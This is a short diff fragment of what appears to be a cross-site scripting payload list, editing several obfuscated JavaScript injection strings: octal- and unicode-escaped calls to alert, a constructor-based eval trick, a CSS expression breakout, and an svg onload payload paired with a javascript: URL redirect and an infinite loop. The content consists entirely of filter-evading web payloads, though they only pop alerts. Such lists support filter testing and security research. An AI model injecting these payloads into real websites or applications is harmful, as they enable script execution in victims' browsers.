@@ -206,6 +206,5 @@ Function.prototype.toString=Function.prototype.call;"alert(1)//".replace("//",Fu
 top[630038579..toString(30)](1)
 */(URL[%26quot;\142\151\147%26quot;][%26quot;\143\157\156\163\164\162\165\143\164\157\162%26quot;](%26quot;\141\154\145\162\164\75\141\154\145\162\164\50\61\51%26quot;)())'%3E%3C%%20style='x:expression/*
 \u{61}l\u{65}rt`1`
-Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>';
-while(1){}
-location='javascript:1+{}'
+Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>';while(1){}location='javascript:1+{}'
+Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>';location='javascript:1+{}'
